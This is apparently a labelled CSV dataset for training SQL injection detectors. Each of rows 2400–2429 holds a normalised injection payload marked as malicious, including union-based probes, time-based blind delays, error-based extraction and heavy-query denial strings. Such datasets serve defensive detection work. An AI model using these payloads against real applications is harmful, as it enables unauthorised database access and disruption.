row_index,payload_norm,label,sqli_type_hint
2400,1'+ ( select 'yjpp' where 8966 = 8966,1,
2401,"1%"" ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ""%"" = """,1,
2402,"-8266%' ) union all select 8626,8626,8626,8626,8626,8626--",1,
2403,"1%' ) ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
2404,"-2787' union all select 3622,3622,3622,3622,3622,3622,3622,3622,3622,3622#",1,
2405,"-6359"" ) ) or elt ( 3546 = 2433,2433 ) and ( ( ""qxat"" = ""qxat",1,
2406,"1"" ) and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) and ( ""rfpq"" = ""rfpq",1,
2407,1 ) ) ) and 6358 = 6735,1,
2408,1' ) ) as cimd where 9608 = 9608,1,
2409,"1' ) as kgnd where 1550 = 1550 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
2410,1'+ ( select 'sbji' where 7989 = 7989 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) ) +',1,
2411,-9690 union all select 7217#,1,
2412,"1 and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) -- dkwz",1,
2413,"1' or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and 'eomt' = 'eomt",1,
2414,"1' ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( 'thce' = 'thce",1,
2415,1' ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ( 'lajk' = 'lajk,1,
2416,1' ) where 1212 = 1212,1,
2417,"1'|| ( select 'ggfx' where 4932 = 4932 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) ) ||'",1,
2418,1' ) ) ) and ( 1685 = 2985 ) *2985 and ( ( ( 'rzwb' = 'rzwb,1,
2419,"1"" ) as yecj where 1194 = 1194 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
2420,"-5411%"" ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""%"" = """,1,
2421,"1%' and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and '%' = '",1,
2422,"1"" ) as crek where 6570 = 6570 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
2423,"-6084"" ) ) union all select 7354,7354,7354,7354,7354,7354,7354,7354#",1,
2424,"1"" or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ""kojr"" = ""kojr",1,
2425,-4191 ) order by 1#,1,
2426,"1"" ) where 6632 = 6632 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",1,
2427,"1"" ) ) waitfor delay '0:0:5' and ( ( ""witb"" = ""witb",1,
2428,1 ) as xylu where 3338 = 3338 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --,1,
2429,-2707' ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( 'mwdq' = 'mwdq,1,
